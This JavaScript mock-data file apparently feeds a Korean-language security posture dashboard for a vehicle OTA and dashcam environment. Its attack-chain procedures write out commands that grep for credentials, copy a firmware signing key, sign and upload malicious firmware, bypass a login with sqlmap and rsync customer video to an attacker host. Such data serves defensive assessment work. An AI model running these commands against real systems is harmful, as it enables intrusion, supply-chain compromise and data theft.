export const scanSummary = {
  scan_id: "SCAN-0047",
  scanned_at: "2025-06-12T14:32:00Z",
  status: "completed",
  summary: {
    total_violations: 47,
    critical_high: 12,
    attack_chains: 8,
  },
};

export const violations = [
  { id: "INV-031", severity: "Critical", description: "서명키 무단 접근 — 개발자 계정", server_zone: "개발", type: "권한", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1078", weight: 10, detected_at: "2025-06-12T14:21:03Z", invariant_source: "fixed" },
  { id: "INV-018", severity: "Critical", description: "OTA 배포서버 익명 접근 허용", server_zone: "배포", type: "접근제어", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1078", weight: 10, detected_at: "2025-06-12T14:21:09Z", invariant_source: "fixed" },
  { id: "INV-042", severity: "High", description: "DMZ→DB 직접 통신 허용", server_zone: "DMZ", type: "네트워크", attack_phase: "내부이동", mitre_tactic: "TA0008", mitre_technique: "T1021", weight: 7, detected_at: "2025-06-12T14:21:15Z", invariant_source: "fixed" },
  { id: "INV-007", severity: "High", description: "펌웨어 업데이트 서명 검증 누락", server_zone: "배포", type: "보안정책", attack_phase: "내부이동", mitre_tactic: "TA0008", mitre_technique: "T1195", weight: 7, detected_at: "2025-06-12T14:21:22Z", invariant_source: "variable" },
  { id: "INV-055", severity: "Medium", description: "고객 영상 데이터 암호화 미적용", server_zone: "DB", type: "보안정책", attack_phase: "데이터탈취", mitre_tactic: "TA0010", mitre_technique: "T1048", weight: 4, detected_at: "2025-06-12T14:21:31Z", invariant_source: "variable" },
  { id: "INV-012", severity: "Medium", description: "관리자 페이지 IP 제한 미설정", server_zone: "운영", type: "접근제어", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1190", weight: 4, detected_at: "2025-06-12T14:21:45Z", invariant_source: "fixed" },
  { id: "INV-029", severity: "Medium", description: "SSH 기본 포트 사용", server_zone: "관리", type: "네트워크", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1110", weight: 4, detected_at: "2025-06-12T14:22:01Z", invariant_source: "fixed" },
  { id: "INV-038", severity: "Low", description: "로그 보관 기간 30일 미만", server_zone: "백업", type: "보안정책", attack_phase: "내부이동", mitre_tactic: "TA0005", mitre_technique: "T1070", weight: 1, detected_at: "2025-06-12T14:22:15Z", invariant_source: "variable" },
  { id: "INV-044", severity: "Low", description: "개발 서버 불필요한 포트 오픈", server_zone: "개발", type: "네트워크", attack_phase: "초기침투", mitre_tactic: "TA0001", mitre_technique: "T1046", weight: 1, detected_at: "2025-06-12T14:22:30Z", invariant_source: "variable" },
  { id: "INV-061", severity: "High", description: "디바이스 인증서 만료 검증 누락", server_zone: "운영", type: "권한", attack_phase: "권한상승", mitre_tactic: "TA0004", mitre_technique: "T1134", weight: 7, detected_at: "2025-06-12T14:22:45Z", invariant_source: "fixed" },
];

export const severityDistribution = [
  { name: "Critical", value: 6,  color: "#0C447C" },
  { name: "High",     value: 6,  color: "#185FA5" },
  { name: "Medium",   value: 21, color: "#378ADD" },
  { name: "Low",      value: 14, color: "#85B7EB" },
];

export const zoneViolations = [
  { zone: "DMZ", count: 14 },
  { zone: "운영", count: 11 },
  { zone: "DB", count: 9 },
  { zone: "개발", count: 7 },
  { zone: "배포", count: 4 },
  { zone: "업무", count: 2 },
];

export const typeViolations = [
  { name: "접근제어", value: 16, color: "#0C447C" },
  { name: "네트워크", value: 13, color: "#185FA5" },
  { name: "권한",    value: 10, color: "#378ADD" },
  { name: "보안정책", value: 8,  color: "#85B7EB" },
];

export const attackChains = [
  {
    chain_id: "CHAIN-001",
    title: "서명키 탈취 및 악성 OTA 배포",
    risk_score: 95,
    nodes: [
      { id: "n1", label: "초기 침투", violation_id: "INV-018", phase: "초기침투" },
      { id: "n2", label: "내부 이동", violation_id: "INV-042", phase: "내부이동" },
      { id: "n3", label: "권한 상승", violation_id: "INV-031", phase: "권한상승" },
      { id: "n4", label: "서명키 탈취", violation_id: "INV-007", phase: "데이터탈취" },
      { id: "n5", label: "악성 OTA 배포", violation_id: null, phase: "최종목표" },
    ],
    edges: [
      { from: "n1", to: "n2" },
      { from: "n2", to: "n3" },
      { from: "n3", to: "n4" },
      { from: "n4", to: "n5" },
    ],
    kill_chain: [
      { step: 1, phase: "초기침투", violation_id: "INV-018", mitre: "T1078", description: "OTA 배포서버 익명 접근 허용 취약점을 이용해 인증 없이 /api/update 엔드포인트에 접근. 별도 자격증명 없이 HTTP 200 응답 수신 가능." },
      { step: 2, phase: "내부이동", violation_id: "INV-042", mitre: "T1021", description: "DMZ→DB 서버 간 방화벽 규칙 부재를 이용해 내부망(192.168.10.0/24)으로 피벗. nmap 스캔으로 DB 포트 오픈 확인 후 직접 연결." },
      { step: 3, phase: "권한상승", violation_id: "INV-031", mitre: "T1078", description: "개발 서버에 하드코딩된 개발자 계정 크리덴셜을 탈취. 해당 계정이 서명키 저장 디렉토리에 읽기 권한을 보유." },
      { step: 4, phase: "데이터탈취", violation_id: "INV-007", mitre: "T1195", description: "HSM 미사용으로 파일시스템에 평문 저장된 RSA 서명키(/opt/ota/keys/signing.key) 추출. 서명 검증 로직 부재로 악성 펌웨어 서명 가능." },
      { step: 5, phase: "최종목표", violation_id: null, mitre: "T1491", description: "추출한 서명키로 악성 펌웨어 이미지 서명 후 OTA 서버에 업로드. 인증 없는 업로드 엔드포인트를 통해 전체 차량 플릿에 악성 업데이트 배포." },
    ],
    techniques: [
      { id: "T1078", name: "유효한 계정 도용", tactic: "초기 접근 / 권한 상승", tool: "Burp Suite", violation_id: "INV-018", description: "인증 강제화가 없는 OTA 서버 엔드포인트로 익명 접근. 관리자 계정 없이도 펌웨어 조회 및 업로드 API 호출 가능." },
      { id: "T1021", name: "원격 서비스 악용 (RDP/SMB)", tactic: "내부 이동", tool: "Metasploit / Netcat", violation_id: "INV-042", description: "DMZ 세그먼트에서 내부 DB 서버로의 직접 TCP 연결이 방화벽에 의해 차단되지 않음. 별도 터널링 없이 내부망 서비스 직접 접근 가능." },
      { id: "T1195", name: "공급망 침해 (Supply Chain)", tactic: "내부 이동", tool: "커스텀 스크립트 / OpenSSL", violation_id: "INV-007", description: "OTA 배포 파이프라인에 서명 검증 단계가 없어 임의 펌웨어 이미지를 정상 업데이트로 위장 가능. 디바이스 측에서도 서명 검증 미구현." },
      { id: "T1552", name: "비보호 자격증명 탈취", tactic: "자격증명 접근", tool: "find / grep / SCP", violation_id: "INV-031", description: "서명키가 HSM 대신 일반 파일시스템에 저장되어 있고 개발자 계정으로 읽기 가능. 키 로테이션 정책 및 접근 감사 로그 미비." },
    ],
    procedures: [
      { step: 1, title: "OTA 서버 익명 접근 확인", command: "curl -X GET http://ota.argus.internal/api/update -v", expected: "HTTP 200 응답 — Authorization 헤더 없이 펌웨어 메타데이터 반환", tool: "curl / Burp Suite" },
      { step: 2, title: "내부망 DB 서버 포트 스캔", command: "nmap -sV -p 1433,3306,5432,27017 192.168.10.0/24 --open", expected: "192.168.10.15:1433 (MSSQL) 오픈 확인 — DMZ에서 직접 도달 가능", tool: "nmap" },
      { step: 3, title: "개발 서버 크리덴셜 덤프", command: "find /opt/ota -name '*.conf' -o -name '*.env' | xargs grep -i 'password\\|secret\\|key' 2>/dev/null", expected: "DB_PASS, DEPLOY_USER 등 평문 크리덴셜 발견", tool: "find / grep" },
      { step: 4, title: "서명키 파일 추출", command: "scp dev@192.168.10.5:/opt/ota/keys/signing.key ./loot/\nopenssl rsa -in ./loot/signing.key -check", expected: "4096-bit RSA 개인키 로컬 저장 성공 — 키 유효성 확인", tool: "SCP / OpenSSL" },
      { step: 5, title: "악성 펌웨어 서명 및 OTA 업로드", command: "openssl dgst -sha256 -sign signing.key -out malicious.sig malicious.bin\ncurl -X POST http://ota.argus.internal/api/upload \\\n  -F 'firmware=@malicious.bin' \\\n  -F 'signature=@malicious.sig' \\\n  -F 'version=2.1.4-hotfix'", expected: "HTTP 200 — 악성 펌웨어가 유효한 업데이트로 등록됨. 다음 차량 OTA 폴링 시 자동 배포.", tool: "OpenSSL / curl" },
    ],
  },
  {
    chain_id: "CHAIN-002",
    title: "고객 영상 데이터 무단 수집",
    risk_score: 78,
    nodes: [
      { id: "n1", label: "초기 침투", violation_id: "INV-012", phase: "초기침투" },
      { id: "n2", label: "내부 이동", violation_id: "INV-042", phase: "내부이동" },
      { id: "n3", label: "데이터 탈취", violation_id: "INV-055", phase: "데이터탈취" },
    ],
    edges: [
      { from: "n1", to: "n2" },
      { from: "n2", to: "n3" },
    ],
    kill_chain: [
      { step: 1, phase: "초기침투", violation_id: "INV-012", mitre: "T1190", description: "관리자 페이지(/admin) IP 화이트리스트 미설정으로 외부 인터넷에서 직접 접근 가능. 로그인 폼에 SQL 인젝션으로 인증 우회." },
      { step: 2, phase: "내부이동", violation_id: "INV-042", mitre: "T1021", description: "관리자 권한으로 DMZ 내 쉘을 획득 후 DB 서버로 피벗. 세그멘테이션 부재로 customer_db에 직접 연결 성공." },
      { step: 3, phase: "데이터탈취", violation_id: "INV-055", mitre: "T1048", description: "고객 영상 데이터가 AES 암호화 없이 스토리지에 저장되어 있어 평문 파일 그대로 rsync로 외부 서버에 전송." },
    ],
    techniques: [
      { id: "T1190", name: "공개 취약점 악용 (Exploit Public-Facing App)", tactic: "초기 접근", tool: "SQLMap / Burp Suite", violation_id: "INV-012", description: "IP 제한 미설정으로 외부에 노출된 관리자 로그인 페이지. SQL 인젝션으로 인증 우회 및 DB 스키마 덤프 가능." },
      { id: "T1021", name: "원격 서비스 악용", tactic: "내부 이동", tool: "MySQL Client / SSH", violation_id: "INV-042", description: "DMZ→내부 DB 직접 통신 허용. 별도 피벗 호스트 없이 관리자 쉘에서 customer_db 포트로 직접 접속." },
      { id: "T1048", name: "대역 외 탈취 (Exfiltration Over Alt Protocol)", tactic: "데이터 탈취", tool: "rsync / HTTPS", violation_id: "INV-055", description: "암호화 미적용 영상 파일을 rsync over SSH 또는 HTTPS POST로 외부 C2 서버에 전송. 전송 트래픽이 정상 백업 트래픽과 구분 불가." },
    ],
    procedures: [
      { step: 1, title: "관리자 페이지 외부 노출 확인", command: "curl -I https://argus.example.com/admin/login\nnmap -sV -p 443,8443 argus.example.com", expected: "HTTP 200 — 외부 IP에서 관리자 로그인 페이지 접근 가능", tool: "curl / nmap" },
      { step: 2, title: "SQL 인젝션으로 인증 우회", command: "sqlmap -u 'https://argus.example.com/admin/login' \\\n  --data='username=admin&password=test' \\\n  --technique=B --level=3 --dbs", expected: "customer_db, ota_db 등 DB 목록 노출 — 인증 우회 성공", tool: "SQLMap" },
      { step: 3, title: "내부 DB 서버 직접 접속", command: "mysql -h 192.168.10.15 -u admin -p'<덤프된 패스워드>' customer_db\nSHOW TABLES;", expected: "video_records, customer_info 테이블 목록 확인 — 방화벽 차단 없음", tool: "MySQL Client" },
      { step: 4, title: "영상 파일 경로 조회 및 대량 탈취", command: "SELECT id, file_path, customer_id FROM video_records LIMIT 5000;\nrsync -avz --progress 192.168.10.15:/data/video/ attacker@203.0.113.5:/exfil/", expected: "평문 영상 파일(.mp4) 대량 다운로드 성공 — 암호화 없이 전송됨", tool: "MySQL / rsync" },
    ],
  },
];

export const mitreMapping = [
  {
    tactic_id: "TA0043", tactic_name: "정찰",
    techniques: [
      { technique_id: "T1595", name: "능동적 스캐닝", severity: "Medium", violation_ids: ["INV-029"] },
      { technique_id: "T1589", name: "피해자 정보 수집", severity: "Low", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0042", tactic_name: "리소스 개발",
    techniques: [
      { technique_id: "T1587", name: "공격 도구 개발", severity: null, violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0001", tactic_name: "초기 접근",
    techniques: [
      { technique_id: "T1078", name: "유효한 계정 도용", severity: "Critical", violation_ids: ["INV-018"] },
      { technique_id: "T1190", name: "공개 취약점 악용", severity: "High", violation_ids: ["INV-012"] },
      { technique_id: "T1110", name: "무차별 대입", severity: "Medium", violation_ids: ["INV-029"] },
    ],
  },
  {
    tactic_id: "TA0002", tactic_name: "실행",
    techniques: [
      { technique_id: "T1059", name: "커맨드 인터프리터", severity: "Medium", violation_ids: [] },
      { technique_id: "T1072", name: "소프트웨어 배포 도구", severity: "High", violation_ids: ["INV-007"] },
    ],
  },
  {
    tactic_id: "TA0003", tactic_name: "지속성",
    techniques: [
      { technique_id: "T1078", name: "유효한 계정 유지", severity: "High", violation_ids: ["INV-031"] },
      { technique_id: "T1505", name: "서버 소프트웨어 컴포넌트", severity: "Medium", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0004", tactic_name: "권한 상승",
    techniques: [
      { technique_id: "T1078", name: "유효한 계정 도용", severity: "Critical", violation_ids: ["INV-031"] },
      { technique_id: "T1134", name: "액세스 토큰 조작", severity: "High", violation_ids: ["INV-061"] },
    ],
  },
  {
    tactic_id: "TA0005", tactic_name: "방어 우회",
    techniques: [
      { technique_id: "T1070", name: "로그 삭제", severity: "Low", violation_ids: ["INV-038"] },
      { technique_id: "T1562", name: "보안 도구 무력화", severity: "Medium", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0006", tactic_name: "자격증명 접근",
    techniques: [
      { technique_id: "T1552", name: "자격증명 탈취", severity: "High", violation_ids: ["INV-031"] },
      { technique_id: "T1555", name: "패스워드 저장소 접근", severity: "Medium", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0007", tactic_name: "탐색",
    techniques: [
      { technique_id: "T1046", name: "네트워크 서비스 스캔", severity: "Low", violation_ids: ["INV-044"] },
      { technique_id: "T1083", name: "파일/디렉토리 탐색", severity: "Low", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0008", tactic_name: "내부 이동",
    techniques: [
      { technique_id: "T1021", name: "원격 서비스 악용", severity: "High", violation_ids: ["INV-042"] },
      { technique_id: "T1195", name: "공급망 침해", severity: "High", violation_ids: ["INV-007"] },
    ],
  },
  {
    tactic_id: "TA0009", tactic_name: "수집",
    techniques: [
      { technique_id: "T1213", name: "정보 저장소 탈취", severity: "Medium", violation_ids: ["INV-055"] },
      { technique_id: "T1119", name: "자동 수집", severity: "Medium", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0011", tactic_name: "C2",
    techniques: [
      { technique_id: "T1071", name: "앱 레이어 프로토콜", severity: "Medium", violation_ids: [] },
      { technique_id: "T1572", name: "프로토콜 터널링", severity: "Low", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0010", tactic_name: "데이터 탈취",
    techniques: [
      { technique_id: "T1048", name: "대역 외 탈취", severity: "Medium", violation_ids: ["INV-055"] },
      { technique_id: "T1041", name: "C2 채널 탈취", severity: "Low", violation_ids: [] },
    ],
  },
  {
    tactic_id: "TA0040", tactic_name: "영향",
    techniques: [
      { technique_id: "T1485", name: "데이터 파괴", severity: "High", violation_ids: [] },
      { technique_id: "T1491", name: "변조", severity: "Medium", violation_ids: ["INV-007"] },
    ],
  },
];

export const pentestResults = [
  {
    scenario_id: "PT-001", chain_id: "CHAIN-001",
    title: "서명키 탈취 및 악성 OTA 배포", result: "success",
    phases: [
      { phase: "초기침투", success: true, detected: false, method: "익명 OTA 접근" },
      { phase: "내부이동", success: true, detected: false, method: "DMZ-DB 직통" },
      { phase: "권한상승", success: true, detected: true, method: "개발자 계정 탈취" },
      { phase: "데이터탈취", success: true, detected: false, method: "서명키 추출" },
    ],
  },
  {
    scenario_id: "PT-002", chain_id: "CHAIN-002",
    title: "고객 영상 데이터 무단 수집", result: "partial",
    phases: [
      { phase: "초기침투", success: true, detected: false, method: "웹캠 API 취약점" },
      { phase: "내부이동", success: true, detected: true, method: "내부망 스캔" },
      { phase: "권한상승", success: false, detected: true, method: "MFA 차단됨" },
      { phase: "데이터탈취", success: false, detected: false, method: "미도달" },
    ],
  },
  {
    scenario_id: "PT-003", chain_id: "CHAIN-003",
    title: "OTA 서버 랜섬웨어 투입", result: "success",
    phases: [
      { phase: "초기침투", success: true, detected: false, method: "스피어 피싱" },
      { phase: "내부이동", success: true, detected: false, method: "내부망 횡이동" },
      { phase: "권한상승", success: true, detected: false, method: "로컬 권한 상승" },
      { phase: "데이터탈취", success: true, detected: false, method: "랜섬웨어 배포" },
    ],
  },
  {
    scenario_id: "PT-004", chain_id: "CHAIN-004",
    title: "펌웨어 변조 후 디바이스 장악", result: "fail",
    phases: [
      { phase: "초기침투", success: true, detected: true, method: "스피어 피싱" },
      { phase: "내부이동", success: false, detected: true, method: "세그멘테이션 차단" },
      { phase: "권한상승", success: false, detected: false, method: "미도달" },
      { phase: "데이터탈취", success: false, detected: false, method: "미도달" },
    ],
  },
  {
    scenario_id: "PT-005", chain_id: "CHAIN-005",
    title: "DB 직접 접근 고객정보 탈취", result: "success",
    phases: [
      { phase: "초기침투", success: true, detected: false, method: "SQL 인젝션" },
      { phase: "내부이동", success: true, detected: false, method: "DB 직접 접근" },
      { phase: "권한상승", success: true, detected: false, method: "DB 계정 탈취" },
      { phase: "데이터탈취", success: true, detected: false, method: "고객정보 덤프" },
    ],
  },
];

export const coverage = {
  초기침투: { total_weight: 29, violated_weight: 16, coverage_pct: 45 },
  내부이동: { total_weight: 25, violated_weight: 18, coverage_pct: 30 },
  권한상승: { total_weight: 22, violated_weight: 10, coverage_pct: 55 },
  데이터탈취: { total_weight: 20, violated_weight: 12, coverage_pct: 40 },
};

export const scoreHistory = [
  { scan_id: "SCAN-0042", scanned_at: "2025-01-10", score: 38 },
  { scan_id: "SCAN-0043", scanned_at: "2025-02-14", score: 44 },
  { scan_id: "SCAN-0044", scanned_at: "2025-03-20", score: 41 },
  { scan_id: "SCAN-0045", scanned_at: "2025-04-08", score: 52 },
  { scan_id: "SCAN-0046", scanned_at: "2025-05-15", score: 49 },
  { scan_id: "SCAN-0047", scanned_at: "2025-06-12", score: 58 },
];

// segment: "DMZ" | "내부망" | "폐쇄망"
// patch_status: "적용완료" | "미적용" | "지연" (7일 초과)
// edr: EDR 설치 여부, av: 백신 설치 여부, managed: 자산 등록 여부
// exposed: 인터넷 직접 노출 여부, privilege: "정상" | "과다"
// os_age: OS 출시 후 경과 연수, cvss_max: 연결 violation 중 최고 CVSS
export const assets = [
  //       id              name               type       segment   zone    ip                 os                  os_age online_status cvss_max patch_status edr    av     managed exposed privilege violation_ids              last_seen
  { id: "ASSET-001", name: "ota-server-01",   type: "서버",    segment: "내부망", zone: "배포", ip: "10.10.1.11",     os: "Ubuntu 22.04",   os_age: 3, online_status: "온라인",    cvss_max: 9.8, patch_status: "지연",    edr: false, av: false, managed: true,  exposed: true,  privilege: "과다", violation_ids: ["INV-018", "INV-007"], last_seen: "2025-06-12T14:30:00Z" },
  { id: "ASSET-002", name: "db-primary",      type: "서버",    segment: "내부망", zone: "DB",   ip: "192.168.10.15",  os: "CentOS 7",       os_age: 7, online_status: "온라인",    cvss_max: 8.1, patch_status: "지연",    edr: false, av: true,  managed: true,  exposed: false, privilege: "정상", violation_ids: ["INV-042", "INV-055"], last_seen: "2025-06-12T14:29:00Z" },
  { id: "ASSET-003", name: "dev-server-02",   type: "서버",    segment: "내부망", zone: "개발", ip: "192.168.20.22",  os: "Ubuntu 20.04",   os_age: 5, online_status: "온라인",    cvss_max: 9.1, patch_status: "미적용",  edr: false, av: false, managed: true,  exposed: false, privilege: "과다", violation_ids: ["INV-031", "INV-044"], last_seen: "2025-06-12T14:28:00Z" },
  { id: "ASSET-004", name: "admin-web",       type: "서버",    segment: "내부망", zone: "운영", ip: "10.10.2.5",      os: "Debian 11",      os_age: 4, online_status: "온라인",    cvss_max: 7.5, patch_status: "미적용",  edr: true,  av: true,  managed: true,  exposed: true,  privilege: "정상", violation_ids: ["INV-012", "INV-061"], last_seen: "2025-06-12T14:27:00Z" },
  { id: "ASSET-005", name: "backup-01",       type: "서버",    segment: "내부망", zone: "백업", ip: "192.168.30.10",  os: "Ubuntu 22.04",   os_age: 3, online_status: "온라인",    cvss_max: 5.3, patch_status: "적용완료", edr: true,  av: true,  managed: true,  exposed: false, privilege: "정상", violation_ids: ["INV-038"],            last_seen: "2025-06-12T14:26:00Z" },
  { id: "ASSET-006", name: "mgmt-server",     type: "서버",    segment: "내부망", zone: "관리", ip: "10.0.0.5",       os: "Rocky Linux 9",  os_age: 1, online_status: "온라인",    cvss_max: 5.9, patch_status: "적용완료", edr: true,  av: true,  managed: true,  exposed: false, privilege: "정상", violation_ids: ["INV-029"],            last_seen: "2025-06-12T14:25:00Z" },
  { id: "ASSET-007", name: "api-gateway",     type: "서버",    segment: "DMZ",   zone: "DMZ",  ip: "172.16.1.1",     os: "Ubuntu 22.04",   os_age: 3, online_status: "온라인",    cvss_max: null, patch_status: "적용완료", edr: true,  av: true,  managed: true,  exposed: true,  privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T14:24:00Z" },
  { id: "ASSET-008", name: "log-server",      type: "서버",    segment: "내부망", zone: "운영", ip: "192.168.40.5",   os: "CentOS 8",       os_age: 5, online_status: "온라인",    cvss_max: null, patch_status: "적용완료", edr: true,  av: true,  managed: true,  exposed: false, privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T14:23:00Z" },
  { id: "ASSET-009", name: "dev-laptop-kim",  type: "PC",      segment: "내부망", zone: "개발", ip: "192.168.20.101", os: "Windows 11",     os_age: 2, online_status: "온라인",    cvss_max: null, patch_status: "적용완료", edr: true,  av: true,  managed: true,  exposed: false, privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T13:50:00Z" },
  { id: "ASSET-010", name: "dev-laptop-lee",  type: "PC",      segment: "내부망", zone: "개발", ip: "192.168.20.102", os: "macOS 14",       os_age: 1, online_status: "온라인",    cvss_max: null, patch_status: "적용완료", edr: true,  av: true,  managed: true,  exposed: false, privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T13:45:00Z" },
  { id: "ASSET-011", name: "ops-workstation", type: "PC",      segment: "내부망", zone: "운영", ip: "10.10.2.100",    os: "Windows 11",     os_age: 2, online_status: "온라인",    cvss_max: null, patch_status: "미적용",  edr: false, av: true,  managed: true,  exposed: false, privilege: "과다", violation_ids: [],                     last_seen: "2025-06-12T13:40:00Z" },
  { id: "ASSET-012", name: "sec-analyst-pc",  type: "PC",      segment: "내부망", zone: "관리", ip: "10.0.0.55",      os: "Ubuntu 22.04",   os_age: 2, online_status: "온라인",    cvss_max: null, patch_status: "적용완료", edr: true,  av: true,  managed: true,  exposed: false, privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T13:35:00Z" },
  { id: "ASSET-013", name: "build-server-pc", type: "PC",      segment: "내부망", zone: "개발", ip: "192.168.20.103", os: "Windows 10",     os_age: 5, online_status: "오프라인", cvss_max: null, patch_status: "미적용",  edr: false, av: false, managed: true,  exposed: false, privilege: "정상", violation_ids: [],                     last_seen: "2025-06-10T09:00:00Z" },
  { id: "ASSET-014", name: "vehicle-ecu-001", type: "IoT",     segment: "폐쇄망", zone: "운영", ip: "10.20.1.1",      os: "AUTOSAR OS",     os_age: 4, online_status: "온라인",    cvss_max: 7.2, patch_status: "지연",    edr: false, av: false, managed: true,  exposed: false, privilege: "정상", violation_ids: ["INV-007"],            last_seen: "2025-06-12T14:20:00Z" },
  { id: "ASSET-015", name: "vehicle-ecu-002", type: "IoT",     segment: "폐쇄망", zone: "운영", ip: "10.20.1.2",      os: "AUTOSAR OS",     os_age: 4, online_status: "온라인",    cvss_max: null, patch_status: "적용완료", edr: false, av: false, managed: true,  exposed: false, privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T14:19:00Z" },
  { id: "ASSET-016", name: "dashcam-unit-03", type: "IoT",     segment: "폐쇄망", zone: "운영", ip: "10.20.2.3",      os: "Linux 5.15",     os_age: 3, online_status: "온라인",    cvss_max: 6.5, patch_status: "미적용",  edr: false, av: false, managed: true,  exposed: false, privilege: "정상", violation_ids: ["INV-055"],            last_seen: "2025-06-12T14:18:00Z" },
  { id: "ASSET-017", name: "telematics-gw",   type: "IoT",     segment: "DMZ",   zone: "DMZ",  ip: "172.16.2.5",     os: "QNX 7.1",        os_age: 6, online_status: "온라인",    cvss_max: null, patch_status: "지연",    edr: false, av: false, managed: false, exposed: true,  privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T14:17:00Z" },
  { id: "ASSET-018", name: "core-switch-01",  type: "네트워크 장비", segment: "DMZ",   zone: "DMZ",  ip: "172.16.0.1",     os: "Cisco IOS 17",   os_age: 3, online_status: "온라인",    cvss_max: null, patch_status: "적용완료", edr: false, av: false, managed: true,  exposed: false, privilege: "정상", violation_ids: [],                     last_seen: "2025-06-12T14:32:00Z" },
  { id: "ASSET-019", name: "fw-dmz-internal", type: "네트워크 장비", segment: "DMZ",   zone: "DMZ",  ip: "172.16.0.2",     os: "Fortinet FortiOS", os_age: 2, online_status: "온라인",  cvss_max: 8.4, patch_status: "미적용",  edr: false, av: false, managed: true,  exposed: true,  privilege: "정상", violation_ids: ["INV-042"],            last_seen: "2025-06-12T14:31:00Z" },
  { id: "ASSET-020", name: "vpn-gateway",     type: "네트워크 장비", segment: "내부망", zone: "관리", ip: "10.0.0.1",       os: "Cisco IOS 17",   os_age: 4, online_status: "오프라인", cvss_max: null, patch_status: "미적용",  edr: false, av: false, managed: false, exposed: true,  privilege: "정상", violation_ids: [],                     last_seen: "2025-06-11T18:00:00Z" },
];

// patch_pct: 패치 적용률(%), unregistered: 비인가/미등록 자산 수, new_assets: 당월 신규 등록 수
export const assetHistory = [
  { date: "01월", total: 42, vulnerable: 7,  offline: 1, patch_pct: 71, unregistered: 3, new_assets: 0, policy_violations: 8  },
  { date: "02월", total: 44, vulnerable: 8,  offline: 1, patch_pct: 68, unregistered: 4, new_assets: 2, policy_violations: 9  },
  { date: "03월", total: 44, vulnerable: 9,  offline: 1, patch_pct: 65, unregistered: 4, new_assets: 0, policy_violations: 10 },
  { date: "04월", total: 46, vulnerable: 9,  offline: 1, patch_pct: 63, unregistered: 5, new_assets: 2, policy_violations: 12 },
  { date: "05월", total: 47, vulnerable: 10, offline: 2, patch_pct: 60, unregistered: 6, new_assets: 1, policy_violations: 14 },
  { date: "06월", total: 48, vulnerable: 11, offline: 2, patch_pct: 56, unregistered: 7, new_assets: 1, policy_violations: 16 },
];

export const assetEvents = [
  { id: "EVT-001", type: "신규장비",    asset: "unknown-device-01", desc: "미등록 장비 네트워크 접속 감지 — MAC 00:1A:2B:3C:4D:5E",     zone: "DMZ",  time: "2025-06-12T14:15:00Z", severity: "High"     },
  { id: "EVT-002", type: "정책위반",    asset: "db-primary",        desc: "내부 DB 서버 외부 포트 오픈 감지 (TCP 3306 → 0.0.0.0/0)",    zone: "DB",   time: "2025-06-12T13:40:00Z", severity: "Critical" },
  { id: "EVT-003", type: "비인가접속",  asset: "ota-server-01",     desc: "인증 없는 OTA API 엔드포인트 접근 — /api/update (익명)",       zone: "배포", time: "2025-06-12T13:22:00Z", severity: "Critical" },
  { id: "EVT-004", type: "신규장비",    asset: "rogue-laptop-x",    desc: "미등록 노트북 내부망 Wi-Fi 접속 — DHCP 할당 192.168.20.199", zone: "개발", time: "2025-06-12T12:55:00Z", severity: "Medium"   },
  { id: "EVT-005", type: "정책위반",    asset: "fw-dmz-internal",   desc: "방화벽 규칙 변경 감지 — 비인가 인바운드 포트 허용 (ANY)",     zone: "DMZ",  time: "2025-06-12T11:30:00Z", severity: "High"     },
  { id: "EVT-006", type: "네트워크이동", asset: "ota-server-01",    desc: "DMZ → DB 구간 비정상 횡이동 탐지 — 192.168.10.15:1433",       zone: "DMZ",  time: "2025-06-12T10:48:00Z", severity: "High"     },
  { id: "EVT-007", type: "정책위반",    asset: "admin-web",         desc: "관리자 페이지 외부 IP 접근 감지 — /admin (203.0.113.42)",      zone: "운영", time: "2025-06-11T22:10:00Z", severity: "High"     },
  { id: "EVT-008", type: "비인가접속",  asset: "dev-server-02",     desc: "퇴직 개발자 계정 SSH 로그인 시도 — 5회 실패 후 차단",          zone: "개발", time: "2025-06-11T18:30:00Z", severity: "Medium"   },
];

export const assetPolicies = [
  { id: "POL-001", policy: "내부 DB 외부 접근 불가",    category: "네트워크 격리", severity: "Critical", linked_violations: ["INV-042"],          violating_assets: ["ASSET-002", "ASSET-019"] },
  { id: "POL-002", policy: "EDR 필수 설치 (서버/PC)",   category: "에이전트 보안", severity: "High",     linked_violations: [],                   violating_assets: ["ASSET-001", "ASSET-002", "ASSET-003", "ASSET-011", "ASSET-013"] },
  { id: "POL-003", policy: "패치 7일 이내 적용",        category: "패치 관리",    severity: "High",     linked_violations: ["INV-018", "INV-031"], violating_assets: ["ASSET-001", "ASSET-002", "ASSET-014", "ASSET-017"] },
  { id: "POL-004", policy: "미등록 자산 네트워크 격리", category: "자산 등록",    severity: "Medium",   linked_violations: [],                   violating_assets: ["ASSET-017", "ASSET-020"] },
];

export const remediations = [
  { violation_id: "INV-031", description: "서명키 HSM 이관 및 접근 로그 강화", attack_phase: "권한상승", priority: "즉시", done: false },
  { violation_id: "INV-018", description: "OTA 서버 인증 강제화 (MFA 적용)", attack_phase: "초기침투", priority: "즉시", done: false },
  { violation_id: "INV-042", description: "DMZ-DB 세그멘테이션 방화벽 규칙 추가", attack_phase: "내부이동", priority: "1주", done: false },
  { violation_id: "INV-007", description: "펌웨어 배포 파이프라인 서명 검증 필수화", attack_phase: "내부이동", priority: "1주", done: false },
  { violation_id: "INV-055", description: "고객 영상 데이터 AES-256 암호화 적용", attack_phase: "데이터탈취", priority: "1개월", done: false },
];

// type: OS | 펌웨어 | 플랫폼 | 애플리케이션 | DB
// patch_status: 적용완료 | 미적용 | 지연
// eol: 공식 지원 종료 여부
export const softwareAssets = [
